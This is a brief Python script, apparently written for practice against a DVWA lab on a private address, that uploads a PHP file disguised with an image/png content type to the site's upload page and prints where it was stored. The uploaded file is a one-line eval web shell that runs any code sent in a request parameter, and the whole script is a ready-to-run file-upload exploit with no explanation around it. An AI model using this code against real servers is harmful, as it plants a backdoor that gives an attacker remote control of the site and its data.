import requests
from bs4 import BeautifulSoup
import lxml

url = "http://192.168.109.100/dv/vulnerabilities/upload/"

headers ={
    "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
    "Cookie":      "security=low; PHPSESSID=rm7s5ddqqoteajcs2iijd3nsp4"
}
data = {
    "MAX_FILE_SIZE":    100000,
    "Upload":           "Upload"
}
files = {
    "uploaded": ("2.php", b"<?php @eval($_REQUEST[777]);phpinfo()?>", "image/png")
}
res = requests.post(url=url, files=files, headers=headers, data=data, allow_redirects=False)

# print(res.text)
# print(res.status_code)
# print(res.headers)
soup = BeautifulSoup(res.content, "lxml")
pre = soup.find_all("pre")
pre = pre[0]

path = pre.text
print(path)